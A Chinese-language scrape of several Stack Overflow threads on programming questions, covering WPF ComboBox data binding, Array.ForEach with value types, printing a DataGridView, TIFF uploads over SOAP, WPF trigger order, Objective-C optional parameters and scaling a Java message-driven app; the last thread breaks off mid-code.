ComboBox 正确显示项目列表，我可以在 UI 中毫无问题地选择一个。但是，当我从命令中显示消息框时，PhonebookEntry 属性仍然具有初始值，而不是 ComboBox 中的选定值。其他 TextBox 实例正在更新并显示在 MessageBox 中。

对 ComboBox 进行数据绑定时我缺少什么？我做了很多搜索，似乎找不到任何我做错的事情。

* * *

这是我看到的行为，但是在我的特定上下文中由于某种原因它不起作用。

我有一个 MainWindowViewModel，它有一个`CollectionView`ConnectionViewModels。在 MainWindowView.xaml 文件代码隐藏中，我将 DataContext 设置为 MainWindowViewModel。MainWindowView.xaml`ItemsControl`绑定到 ConnectionViewModels 的集合。我有一个包含 ComboBox 以及其他一些 TextBoxes 的 DataTemplate。文本框直接绑定到 ConnectionViewModel 的属性，使用`Text="{Binding Path=ConnectionName}"`.

```
public class ConnectionViewModel : ViewModelBase
{
    public string Name { get; set; }
    public string Password { get; set; }
}

public class MainWindowViewModel : ViewModelBase
{
    // List<ConnectionViewModel>...
    public CollectionView Connections { get; set; }
} 
```

XAML 代码隐藏：

```
public partial class Window1
{
    public Window1()
    {
        InitializeComponent();
        DataContext = new MainWindowViewModel();
    }
} 
```

**然后是 XAML：**

```
<DataTemplate x:Key="listTemplate">
    <Grid>
        <ComboBox ItemsSource="{Binding Path=PhonebookEntries}"
            DisplayMemberPath="Name"
            SelectedValuePath="Name"
            SelectedValue="{Binding Path=PhonebookEntry}" />
        <TextBox Text="{Binding Path=Password}" />
    </Grid>
</DataTemplate>

<ItemsControl ItemsSource="{Binding Path=Connections}"
    ItemTemplate="{StaticResource listTemplate}" /> 
```

文本框都正确绑定，数据在它们和 ViewModel 之间移动没有问题。只有 ComboBox 不起作用。

您对 PhonebookEntry 类的假设是正确的。

我所做的假设是我的 DataTemplate 使用的 DataContext 是通过绑定层次结构自动设置的，因此我不必为`ItemsControl`. 这对我来说似乎有点愚蠢。

* * *

这是基于上面示例的演示问题的测试实现。

**XAML：**

```
<Window x:Class="WpfApplication7.Window1"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="Window1" Height="300" Width="300">
    <Window.Resources>
        <DataTemplate x:Key="itemTemplate">
            <StackPanel Orientation="Horizontal">
                <TextBox Text="{Binding Path=Name}" Width="50" />
                <ComboBox ItemsSource="{Binding Path=PhonebookEntries}"
                    DisplayMemberPath="Name"
                    SelectedValuePath="Name"
                    SelectedValue="{Binding Path=PhonebookEntry}"
                    Width="200"/>
            </StackPanel>
        </DataTemplate>
    </Window.Resources>
    <Grid>
        <ItemsControl ItemsSource="{Binding Path=Connections}"
            ItemTemplate="{StaticResource itemTemplate}" />
    </Grid>
</Window> 
```

**代码**隐藏：

```
namespace WpfApplication7
{
    /// <summary>
    /// Interaction logic for Window1.xaml
    /// </summary>
    public partial class Window1 : Window
    {
        public Window1()
        {
            InitializeComponent();
            DataContext = new MainWindowViewModel();
        }
    }

    public class PhoneBookEntry
    {
        public string Name { get; set; }
        public PhoneBookEntry(string name)
        {
            Name = name;
        }
    }

    public class ConnectionViewModel : INotifyPropertyChanged
    {

        private string _name;

        public ConnectionViewModel(string name)
        {
            _name = name;
            IList<PhoneBookEntry> list = new List<PhoneBookEntry>
                                             {
                                                 new PhoneBookEntry("test"),
                                                 new PhoneBookEntry("test2")
                                             };
            _phonebookEntries = new CollectionView(list);
        }
        private readonly CollectionView _phonebookEntries;
        private string _phonebookEntry;

        public CollectionView PhonebookEntries
        {
            get { return _phonebookEntries; }
        }

        public string PhonebookEntry
        {
            get { return _phonebookEntry; }
            set
            {
                if (_phonebookEntry == value) return;
                _phonebookEntry = value;
                OnPropertyChanged("PhonebookEntry");
            }
        }

        public string Name
        {
            get { return _name; }
            set
            {
                if (_name == value) return;
                _name = value;
                OnPropertyChanged("Name");
            }
        }
        private void OnPropertyChanged(string propertyName)
        {
            if (PropertyChanged != null)
                PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
        }
        public event PropertyChangedEventHandler PropertyChanged;
    }

    public class MainWindowViewModel
    {
        private readonly CollectionView _connections;

        public MainWindowViewModel()
        {
            IList<ConnectionViewModel> connections = new List<ConnectionViewModel>
                                                          {
                                                              new ConnectionViewModel("First"),
                                                              new ConnectionViewModel("Second"),
                                                              new ConnectionViewModel("Third")
                                                          };
            _connections = new CollectionView(connections);
        }

        public CollectionView Connections
        {
            get { return _connections; }
        }
    }
} 
```

如果您运行该示例，您将得到我正在谈论的行为。TextBox 在您编辑它时会更新其绑定，但 ComboBox 不会。看到我所做的唯一一件事就是引入一个父 ViewModel 非常令人困惑。

我目前的印象是绑定到 DataContext 的子项的项具有该子项作为其 DataContext。我找不到任何可以以一种或另一种方式解决此问题的文档。

IE，

Window -> DataContext = MainWindowViewModel
..Items -> 绑定到 DataContext.PhonebookEntries
....Item -> DataContext = PhonebookEntry（隐式关联）

我不知道这是否更好地解释了我的假设（？）。

* * *

为了确认我的假设，将 TextBox 的绑定更改为

```
<TextBox Text="{Binding Mode=OneWay}" Width="50" /> 
```

这将显示 TextBox 绑定根（我将其与 DataContext 进行比较）是 ConnectionViewModel 实例。

* * *

## 回答 #1

> 赞同：209
> 
> 时间：2009-02-18T15:06:16.023

您将 DisplayMemberPath 和 SelectedValuePath 设置为“Name”，因此我假设您有一个具有公共属性 Name 的类 PhoneBookEntry。

您是否将 DataContext 设置为 ConnectionViewModel 对象？

我复制了你的代码并做了一些小的修改，它似乎工作正常。我可以设置 viewmodels PhoneBookEnty 属性并且组合框中的选定项发生更改，并且我可以更改组合框中的选定项并且视图模型 PhoneBookEntry 属性设置正确。

这是我的 XAML 内容：

```
<Window x:Class="WpfApplication6.Window1"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Window1" Height="300" Width="300">
<Grid>
    <StackPanel>
        <Button Click="Button_Click">asdf</Button>
        <ComboBox ItemsSource="{Binding Path=PhonebookEntries}"
                  DisplayMemberPath="Name"
                  SelectedValuePath="Name"
                  SelectedValue="{Binding Path=PhonebookEntry}" />
    </StackPanel>
</Grid>
</Window> 
```

这是我的代码隐藏：

```
namespace WpfApplication6
{

    /// <summary>
    /// Interaction logic for Window1.xaml
    /// </summary>
    public partial class Window1 : Window
    {
        public Window1()
        {
            InitializeComponent();
            ConnectionViewModel vm = new ConnectionViewModel();
            DataContext = vm;
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            ((ConnectionViewModel)DataContext).PhonebookEntry = "test";
        }
    }

    public class PhoneBookEntry
    {
        public string Name { get; set; }

        public PhoneBookEntry(string name)
        {
            Name = name;
        }

        public override string ToString()
        {
            return Name;
        }
    }

    public class ConnectionViewModel : INotifyPropertyChanged
    {
        public ConnectionViewModel()
        {
            IList<PhoneBookEntry> list = new List<PhoneBookEntry>();
            list.Add(new PhoneBookEntry("test"));
            list.Add(new PhoneBookEntry("test2"));
            _phonebookEntries = new CollectionView(list);
        }

        private readonly CollectionView _phonebookEntries;
        private string _phonebookEntry;

        public CollectionView PhonebookEntries
        {
            get { return _phonebookEntries; }
        }

        public string PhonebookEntry
        {
            get { return _phonebookEntry; }
            set
            {
                if (_phonebookEntry == value) return;
                _phonebookEntry = value;
                OnPropertyChanged("PhonebookEntry");
            }
        }

        private void OnPropertyChanged(string propertyName)
        {
            if (PropertyChanged != null)
                PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
        }
        public event PropertyChangedEventHandler PropertyChanged;
    }
} 
```

**编辑：** Geoffs 的第二个例子似乎不起作用，这对我来说似乎有点奇怪。如果我**将 ConnectionViewModel 上的 PhonebookEntries 属性更改为 ReadOnlyCollection 类型**，则组合框上 SelectedValue 属性的 TwoWay 绑定可以正常工作。

可能是 CollectionView 有问题？我注意到输出控制台中有一个警告：

> System.Windows.Data 警告：50：不完全支持直接使用 CollectionView。基本功能工作，虽然效率低下，但高级功能可能会遇到已知的错误。考虑使用派生类来避免这些问题。

**Edit2 (.NET 4.5)：** DropDownList 的内容可以基于 ToString() 而不是 DisplayMemberPath，而 DisplayMemberPath 仅指定所选和显示项目的成员。

* * *

## 回答 #2

> 赞同：84
> 
> 时间：2010-01-05T10:50:06.520

将数据绑定到 ComboBox

```
List<ComboData> ListData = new List<ComboData>();
ListData.Add(new ComboData { Id = "1", Value = "One" });
ListData.Add(new ComboData { Id = "2", Value = "Two" });
ListData.Add(new ComboData { Id = "3", Value = "Three" });
ListData.Add(new ComboData { Id = "4", Value = "Four" });
ListData.Add(new ComboData { Id = "5", Value = "Five" });

cbotest.ItemsSource = ListData;
cbotest.DisplayMemberPath = "Value";
cbotest.SelectedValuePath = "Id";

cbotest.SelectedValue = "2"; 
```

`ComboData`好像：

```
public class ComboData
{ 
  public int Id { get; set; } 
  public string Value { get; set; } 
} 
```

（请注意，`Id`并且`Value`必须是属性，而不是类字段）

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2009-10-05T21:41:42.383

起初我遇到了一个相同的问题，但结果证明是由于 NHibernate/WPF 兼容性问题。该问题是由 WPF 检查对象相等性的方式引起的。通过使用 SelectedValue 和 SelectedValuePath 属性中的对象 ID 属性，我能够让我的东西正常工作。

```
<ComboBox Name="CategoryList"
          DisplayMemberPath="CategoryName"
          SelectedItem="{Binding Path=CategoryParent}"
          SelectedValue="{Binding Path=CategoryParent.ID}"
          SelectedValuePath="ID"> 
```

有关详细信息，请参阅 Chester 的博客文章，*[WPF ComboBox - SelectedItem、SelectedValue 和 SelectedValuePath with NHibernate](http://www.skimedic.com/blog/post/2008/10/02/The-WPF-ComboBox-SelectedItem-SelectedValue-and-SelectedValuePath-with-NHibernate.aspx)*。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-10-11T15:05:24.127

我有一个类似的问题，即 SelectedItem 从未更新。

我的问题是所选项目与列表中包含的项目不同。所以我只需要重写 MyCustomObject 中的 Equals() 方法并比较这两个实例的 ID 以告诉 ComboBox 它是同一个对象。

```
public override bool Equals(object obj)
{
    return this.Id == (obj as MyCustomObject).Id;
} 
```

# c# - c# 使用带有值类型或字符串数 组的 Array.ForEach 动作谓词

> ID：561170
> 
> 赞同：3
> 
> 时间：2009-02-18T14:07:23.467
> 
> 标签：c#, foreach, action

我认为以下代码段不起作用（数组项未修改）是否正确，*因为*数组是整数，它是值类型。

```
class Program
{
    public static void Main()
    {
        int[] ints = new int[] { 1,2 };

        Array.ForEach(ints, new Action<int>(AddTen));

        // ints is not modified
    }
    static void AddTen(int i)
    {
        i+=10;
    }
} 
```

如果示例使用字符串数组，这同样适用，大概是因为字符串是不可变的。

我的问题是：-

有没有解决的办法？我无法更改回调方法的签名 - 例如通过添加 ref 关键字并且我不想用类包装值类型 - 这可以工作......

（当然，我可以简单地编写一个老式的 foreach 循环来做到这一点！）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-18T14:10:10.183

您只是在更改局部变量 - 而不是列表中的项目。为此，您需要`ConvertAll`创建一个新列表/数组：

```
 int[] ints = new int[] { 1,2 };

    int[] newArr = Array.ConvertAll<int,int>(ints, AddTen); 
```

和：

```
static int AddTen(int i)
{
    return i+10;
} 
```

这也可以用匿名方法编写：

```
int[] newArr = Array.ConvertAll<int,int>(ints,
    delegate (int i) { return i+ 10;}); 
```

或者在 C# 3.0 中作为 lambda：

```
int[] newArr = Array.ConvertAll(ints, i=>i+10); 
```

除此之外......一个`for`循环：

```
for(int i = 0 ; i < arr.Length ; i++) {
    arr[i] = AddTen(arr[i]); // or more directly...
} 
```

但无论如何，你将不得不*从*你的方法中获得价值。除非你改变签名，否则你不能。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-18T14:10:24.440

Array.ForEach() 方法不会让您实际修改它的成员。您可以使用 LINQ 来修改它，例如

```
ints = ints.Select(x => x +10 ).ToArray(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T14:11:31.083

foreach 是唯一的方法，数组和列表中的值类型总是被复制，因此修改它们是行不通的，除非你将修改后的值存储回来。AddTen 方法没有这样做，它修改了自己的副本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T14:13:14.450

首先，修改您正在`foreach`处理的集合通常很危险。大多数集合都维护一个内部“版本标签”来跟踪更改，因此枚举器在尝试迭代修改后的集合时会抛出异常。

至于您的问题，您无法使用值类型和`Array.ForEach`. 使用`foreach`或`Convert`做你想做的事。

# winforms - 打印 .NET DataGridView

> ID：561174
> 
> 赞同：15
> 
> 时间：2009-02-18T14:08:23.027
> 
> 标签：winforms, printing, .net-3.5, datagridview

我对 .NET 和 C# 还很陌生，但我有一个要打印的 DataGridView。这样做的最佳方法是什么？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-07-09T23:45:46.897

添加一个 DataGridView、一个 PrintDocuemnt 和一个 Button，然后：

```
button click events {
    printDocument1.Print();
}

printDocument1_PrintPage events {
    Bitmap bm = new Bitmap(this.dataGridView1.Width, this.dataGridView1.Height);
    this.dataGridView1.DrawToBitmap(bm, new Rectangle(0, 0, this.dataGridView1.Width, this.dataGridView1.Height));
    e.Graphics.DrawImage(bm, 0, 0);
} 
```

这就是您的所有数据打印。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-18T14:17:55.157

[CodeProject](http://www.codeproject.com/KB/grid/PrintDataGridView.aspx)上有一些项目已经完成了一些打印 DataGridViews 的工作。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2010-08-11T16:38:41.593

我知道您已经接受了答案，但是对于下一个搜索此问题的人...

我还在 Code Project 上找到了这个很棒的项目，并且刚刚实现了它。这很容易而且很好。 [http://www.codeproject.com/KB/grid/GridDrawer.Net.aspx](http://www.codeproject.com/KB/grid/GridDrawer.Net.aspx)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2011-04-28T13:43:54.227

在[CodeProject](http://www.codeproject.com)上：

> > [aureolin 的另一个 DataGridView 打印机](http://www.codeproject.com/KB/printing/DGVPrinter.aspx "aureolin 的另一个 DataGridView 打印机")

上面是另一款`DataGridView`非常容易实现的优秀打印机。

我意识到我是最近来这个帖子的*强尼。*我在寻找其他东西时偶然发现了它，但想为通过这种方式发生的其他人（就像我所做的那样）参考这个出色的打印解决方案。

我希望这里有人能从中得到一些用处。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-02-18T14:12:20.803

恐怕没有内置的打印支持。

您可能会求助于使用第三方控件，例如具有内置打印支持的[Infragistics WinGrid 。](http://www.infragistics.com/dotnet/netadvantage/winforms/wingrid.aspx#Overview)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-02-18T14:41:41.480

您可以将 DataGridView 导出到 Excel，然后从 Excel 中打印出来。

您也可以考虑不在 DataGridView 中显示您的数据，而是在 ReportViewer 控件中显示它，该控件可以导出为 PDF 或 Excel。从那里可以打印您的数据。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-02-18T14:16:33.833

.NET WinForm 控件（如 datagridview）本身不支持打印。

但是，对于 datagridview，您可以调用“DrawToBitmap”，然后获取该位图并将其传递给打印功能，以便在纸上生成它。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-02-18T16:02:05.110

如果您要打印的不仅仅是 DataGridViews，那么更通用的方法可能值得追求。我们使用 MigraDoc，然后编写自己的类来读取 DataGridViews 并输出表示表的 MigraDoc 类。

有很多很棒的打印包可用，但我只有使用 MigraDoc 的经验。

**编辑：**

作为对评论的回应，这里有一个指向我的站点的链接，其中显示了我为生成 MigraDoc 表而创建的代码以及使用它来显示 DataGridView（从[DataGridView 到 MigraDoc 表](http://www.gowland.ca/printing-tables-with-migradoc)）的示例。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2011-01-31T19:55:30.880

我喜欢这种方法[http://www.codeproject.com/KB/grid/GridDrawer.Net.aspx](http://www.codeproject.com/KB/grid/GridDrawer.Net.aspx)但是有什么方法可以选择打印机。

我想在流程结束时自动打印。所以计划选择这个作为选项 1，所以我总是可以打印到默认打印机。另一个选项是选择打印机然后打印。所以总共有 2 个 ptint 函数。请回复。干杯

# .net - 通过 SOAP 发送 TIFF 图像时的大请求

> ID：561175
> 
> 赞同：0
> 
> 时间：2009-02-18T14:08:45.053
> 
> 标签：.net, performance, web-services, soap

我们有一个带有上传图片方法的 WebService，该方法接受一个字节数组，它是一个 TIFF。

在客户端加载 TIFF `Image.FromFile(path)`，然后将其保存到`MemoryStream`. 然后`memoryStream.ToArray()`调用它产生一个字节数组，用于 WebService 请求。

目前我们有一个 130 KB 大的 TIFF，但总请求大小几乎是 10 MB。这怎么可能发生？这是因为该`Image.FromFile`方法将 TIFF 转换（放气）为标准格式，所以压缩等丢失了吗？有没有更好的方法来做到这一点？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T14:13:58.630

将 tiff 加载到图像中确实会删除 TIFF 的所有压缩。

如果您真的不需要将其加载到图像中，我只需将其作为任意文件读入内存并以这种方式发送字节数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:14:12.000

我还没有证实你的建议（Image 正在将 tiff 解压缩成一个更大的文件）实际上正在发生，尽管它看起来很可能。但是，如果是这种情况，那么您不能不以图像的形式读取文件，而是以二进制文件的形式读取文件吗？

只需像读取二进制文件一样读取文件，然后将其放入 memoryStream。那么解压应该没有问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T14:15:22.370

也许你可以使用 WSE 3.0 MTOM，witch 是通过 Web 服务发送图像的最佳方式

[你可以在这里](http://www.codeproject.com/KB/XML/MTOMWebServices.aspx)找到更多信息

# wpf - 在 WPF 中，触发器的顺序是否重要？

> ID：561178
> 
> 赞同：61
> 
> 时间：2009-02-18T14:09:54.507
> 
> 标签：wpf, triggers

我有以下 xaml：

```
<DockPanel>
    <DockPanel.Resources>
        <Style TargetType="Button">
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Foreground" Value="Yellow"></Setter>
                </Trigger>
                <Trigger Property="IsPressed" Value="True">
                    <Setter Property="Foreground" Value="Green"></Setter>
                </Trigger>
            </Style.Triggers>
        </Style>
    </DockPanel.Resources>
    <Button Content="Cut" Height="30" Width="75"/>
</DockPanel> 
```

发生的情况是，当我将鼠标悬停在按钮上时，前景变为黄色，然后当我按下按钮时，前景变为绿色。

现在，如果我颠倒 XAML 中触发器的顺序，当我将鼠标悬停在前景上时，前景会变为黄色，但当我按下按钮时，前景不会变为绿色。

对此有何解释？一个触发器是否覆盖另一个触发器？

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2009-02-18T14:12:56.527

WPF 正在按声明的顺序处理您的触发器。在第二个例子中，前景被短暂地变成了绿色。但随后 IsMouseOver 触发器运行并将颜色设置回黄色。

IsMouseOver 在优先级方面与 IsPressed 没有关系。重要的是触发器在 XAML 中的声明顺序。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2016-07-26T08:29:25.813

简而言之：触发器按顺序处理。

后面的触发器会覆盖前面的触发器。

# objective-c - Objective-C 2.0 中的可选参数？

> ID：561185
> 
> 赞同：59
> 
> 时间：2009-02-18T14:11:22.707
> 
> 标签：objective-c

在 Objective-C 2.0 中，是否可以创建一个参数是可选的方法？也就是说，你可以有这样的方法调用：

```
[aFraction print]; 
```

还有这个：

```
[aFraction print: someParameter]; 
```

在同一个程序中。

Apple 的**Objective-C 2.0 编程语言**指南将 Obj-C 与 Python 进行了对比，似乎说这是不允许的。我还在学习，我想确定一下。如果可能，那么语法*是*什么，因为我的第二个代码示例不起作用。

**更新：** 好的，我刚刚做了两个方法，都命名为“print”。

*标题*

```
-(void) print;
-(void) print: (BOOL) someSetting; 
```

*执行*

```
-(void) print {
    [self print:0];
}

-(void) print: (BOOL) someSetting {
    BOOL sv;
    sv = someSetting;

    if ( sv ) {
        NSLog(@"cool stuff turned on");
    }
    else {
        NSLog(@"cool stuff turned off");
    }
} 
```

*相关程序行*

```
 ...
    printParamFlag = TRUE;

// no parameter
    [aCodeHolder print];

// single parameter
    [aCodeHolder print:printParamFlag];
    ... 
```

我不敢相信这有效。有什么理由我不应该这样做吗？

* * *

## 回答 #1

> 赞同：91
> 
> 时间：2009-02-18T14:17:32.660

您可以声明多个方法：

```
- (void)print;
- (void)printWithParameter:(id)parameter;
- (void)printWithParameter:(id)parameter andColor:(NSColor *)color; 
```

在实现中，您可以这样做：

```
- (void)print {
    [self printWithParameter:nil];
}

- (void)printWithParameter:(id)parameter {
    [self printWithParameter:nil andColor:[NSColor blackColor]];
} 
```

**编辑：**

请不要同时使用`print`和`print:`。首先，它没有指出参数是什么，其次没有人（ab）以这种方式使用Objective-C。大多数框架都有非常清晰的方法名称，这是使 Objective-C 编程如此轻松的一件事。一个普通的开发者是不会想到这种方法的。

有更好的名字，例如：

```
- (void)printUsingBold:(BOOL)bold;
- (void)printHavingAllThatCoolStuffTurnedOn:(BOOL)coolStuff; 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2009-02-19T01:51:12.713

你这样做的方式是在 Objective-C 中正确的方式。它在 Cocoa 中被广泛使用。例如，一些 NSString 的初始化器：

```
– initWithFormat:  
– initWithFormat:arguments:  
– initWithFormat:locale:  
– initWithFormat:locale:arguments: 
```

它起作用的原因是因为它`:`是方法名称的一部分，就编译器而言，`print`它们`print:`是完全不同的消息，它们之间的联系并不比“print”和“sprint”更紧密。

但是，您给出的方法的特定名称并不是一个很好的例子，因为从名称中不清楚参数是什么（或者如果参数是对象打印的，则“打印”本身意味着什么）。最好有，说，`printFalseMessage`和`printMessageWithFlag:`。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-02-20T00:21:37.677

多个可选参数的另一个选项是将它们全部传递到 NSDictionary 中：

```
- (void)someMethodWithOptions:(NSDictionary *)options; 
```

然后声明选项字典可能包含：

```
- key1, value must be a BlahObject
- key2, value must be a NonBlahObject 
```

然后，您可以允许任何键不存在，甚至字典本身也可以为零。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2009-02-19T08:43:47.917

稍微相关，您可以有可选参数。这意味着您可以根据需要调用带有任意数量参数的方法。但这是 C (varargs) 的一个特性。

一个例子，是**NSArray**消息：

```
+ (id)arrayWithObjects:(id)firstObj, ... 
```

使用示例：

```
NSArray *myArray;
NSDate *aDate = [NSDate distantFuture];
NSValue *aValue = [NSNumber numberWithInt:5];
NSString *aString = @"a string";

myArray = [NSArray arrayWithObjects:aDate, aValue, aString, nil]; 
```

这直接来自 Apple 文档。您用**nil**表示所有参数的结束。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-15T13:33:19.660

为避免*Parse 问题：'aVariable' 用作前一个参数的名称，而不是作为*您从编译器获得的选择器的一部分，您应该这样做：

```
- (void)printWithParameter:(BOOL)sv color:(NSColor *)color{
   // your cool code goes here
   if ( sv ) {
      NSLog(@"cool stuff turned on");
   }
   else {
      NSLog(@"cool stuff turned off");
   }
} 
```

您可以调用该方法，例如：

```
[self printWithParameter:NO color:[UIColor someColor]] // NO instead of 0 
```

或者

```
[self printWithParameter:YES color:[UIColor someColor]] // YES instead of 1 
```

# java - Java 独立应用程序的可扩展性和高可用性

> ID：561188
> 
> 赞同：6
> 
> 时间：2009-02-18T14:12:49.817
> 
> 标签：java, spring, scalability, high-availability

我们目前正在 Linux 机器上运行 Java 集成应用程序。首先是应用程序的概述。

Java 应用程序是一个独立的应用程序（未部署在任何 Java EE 应用程序服务器上，如 OracleAS、WebLogic、JBOSS 等）。独立我的意思是它不是桌面应用程序。但是，它是从 Main 类的命令行运行的。用户根本不直接与此应用程序交互。使用 API 将消息转储到队列中，然后由我的应用程序读取，该应用程序 24/7 持续运行。我不认为这是一个桌面应用程序，因为用户没有直接与之交互。（不确定这是否是有资格成为一个的正确理由）。

它使用 Spring 并连接到 WebSphere MQ 和 Oracle 数据库 我们使用 Spring 侦听器（Spring Message Driven POJOs）来侦听 WebSphere MQ 上的队列。一旦队列中有消息，应用程序从 MQ 读取消息并将其转储（插入/更新）到数据库中。

现在的问题是：

1.  我们如何水平扩展这个应用程序？我的意思是只放置更多的盒子并运行同一个应用程序的多个实例，这是一种可行的方法吗？
2.  我们是否应该考虑从 Spring MDP 迁移到 EJB MDB？从而将其部署在 Application Server 上。这样做有什么额外的好处吗？
3.  是否有请求使应用程序高可用（HA）？可以采用哪些建议的方法或策略来制作独立的应用程序 HA？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T17:19:29.870

另一个选择是[Terracotta](http://www.terracotta.org/web/display/enterprise/Home)，一个完全满足您需求的框架；同时在多台机器上运行您的应用程序并平衡它们之间的负载。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T15:41:16.970

随着数据需求的增加，任何应用程序的水平扩展最终都会遇到限制。这些限制由负载和服务器/数据库性能决定。在某些时候，如果需求和负载随着扩展而增加，服务器/数据库的数量也必须增加。根据存储的数据，服务器/数据库要么必须被复制和同步，要么需要采用某种散列算法在多个服务器之间拆分数据。随着您增加同步数据源的数量，复制/同步这些服务器的成本也会增加。这就是为什么散列方法可能更有吸引力以最小化成本。

真正的高可用性解决方案实施起来非常昂贵。我也看到了不同程度的 HA，但根据定义，它意味着绝对最小或没有停机时间，或者失去对数据源的访问权限。为了实现这一点，需要大量冗余硬件、网络和软件，这些硬件、网络和软件能够在其中一个数据源发生故障时利用冗余硬件而不会失去获取数据的能力。硬件故障是不可避免的，它会发生，还有断电和其他随机自然行为。根据这些数据的重要性，HA 解决方案还需要多个独立电网上的多个数据中心。这显然会*非常*昂贵，所以这完全取决于这些数据对最终用户的重要性。

因此，HA 是一个需要昂贵架构的极端场景。我发现大多数时候人们只对最小化停机时间感兴趣，并且根据数据源的大小，这可以通过添加数据源的热备件相当便宜地实现。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-15T17:24:39.460

1.  水平缩放消息驱动的应用程序很容易......大多数时候。您当然可以添加另一个在同一队列上运行的消息侦听器。不过要小心，因为您可能对消息的顺序有微妙的依赖关系。它们现在可能不是问题，只有一个处理器，但如果有多个处理器，您可以保证消息在某些时候会“乱序”处理。
2.  EJB MDP 不提供 Spring MDB 之外的任何东西。坚持什么是有效的。
3.  水平扩展处理器是一个开始，但这需要更多讨论。

对于 HA，您需要明确要求。“高可用性”对于基于队列的应用程序来说是一个有趣的问题。如果您的应用程序出现故障几分钟，消息就会堆积在队列中。只要您可以让您的应用程序重新启动并运行，这些消息仍将得到处理，只是延迟时间更长。可能值得问：“消息的最大可接受延迟是多少？”

可能存在一些关于硬件故障、数据中心丢失等方面的担忧。这些不会通过在同一位置进行水平扩展来解决。您需要在每一层复制所有组件：队列本身、处理器、后端数据库以及连接它们的所有网络硬件。

这是一个昂贵的提议，因此也值得一问，“HA 场景和非 HA 场景之间的停机时间预期损失的年化损失是多少？” ALE 包含直接损失和监管或法律成本，因此它是捕获停机成本的好方法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T14:33:55.383

“独立”==“桌面”吗？

用户如何与拥有消息驱动 bean 的控制器交互？

我对你的问题的看法：

1.  您可以通过向侦听器池添加更多消息侦听器来进行扩展，因为每个侦听器都在自己的线程中运行。您应该将数据库连接池的大小与消息侦听器相匹配，这样也必须增加。在添加更多服务器之前执行此操作。确保您手头有足够的 RAM。
2.  我看不出 EJB MDB 比 Spring MDB 给你带来了什么。您一直提到“应用服务器”。您是指 WebLogic、WebSphere、JBOSS、Glassfish 等 Java EE 应用服务器吗？因为如果您在 Tomcat 上部署 Spring，我会认为 Tomcat 是本次对话中的“应用服务器”。
3.  HA 意味着负载平衡和故障转移。您需要拥有同步或可热重新部署的数据库。与队列相同。F5 是一个很好的负载平衡硬件解决方案。如果你有一些，我会和你的基础设施人员谈谈。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-15T18:27:26.143

.1。在队列上创建更多的侦听器可以扩展消费者的数量。当一个消费者死亡时，剩余的消费者可以继续运行。注意：您的 MQ 和数据库也需要具有高可用性解决方案。

.2\. 不确定应用程序服务器会对您的情况产生什么影响。也许您可以解释您打算使用哪些功能？

.3\. 请参阅我对 1\. 对于 HA 的回答。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-07-08T14:52:28.483

你试过做多个盒子吗？我想你可能会看到你的 MQ 的文档？运行多个盒子可能需要在您的 MQ 中进行一些配置，但它会运行 ISA

# .net - 创建自定义 datagridrowview

> ID：561201
> 
> 赞同：0
> 
> 时间：2009-02-18T14:16:02.120
> 
> 标签：.net, winforms, datagridview

我正在尝试创建一个类似于 SQL Management Studio 中的自定义网格视图，用于将字段映射到另一个数据库。 [替代文字 http://img5.imageshack.us/img5/5183/columnmappingsdg5.png](http://img5.imageshack.us/img5/5183/columnmappingsdg5.png "SQL Studio 列映射")

我试图创建一个自定义 datagridviewrow，其中包含自定义单元格视图，里面有控件，我得到的只是里面的空单元格。

[替代文字 http://img9.imageshack.us/img9/8890/testedexampleeg7.png](http://img9.imageshack.us/img9/8890/testedexampleeg7.png "我在同一件事上的糟糕尝试")

有谁知道我如何才能让它工作。我看过其他帖子，我认为它们不适用于这种情况。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-06T15:19:02.817

除非我误解了您的问题，否则这可以在设计时或运行时轻松完成，但您必须将*列*定义为具有控件类型的列，而不是添加行：

*   在设计时，只需将 DataGridView 控件拖到您的窗体中。
*   右键单击网格，然后单击“添加列”
*   选择“未绑定列”
*   在类型组合框中，选择列的类型。您可以选择复选框、组合框、文本、图像...
*   单击“添加”，根据需要重复。

现在，如果您需要在运行时执行此操作，只需在带有 datagridview 的表单中执行以下操作：

```
Private Sub Form1_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load

    'Define the new columns

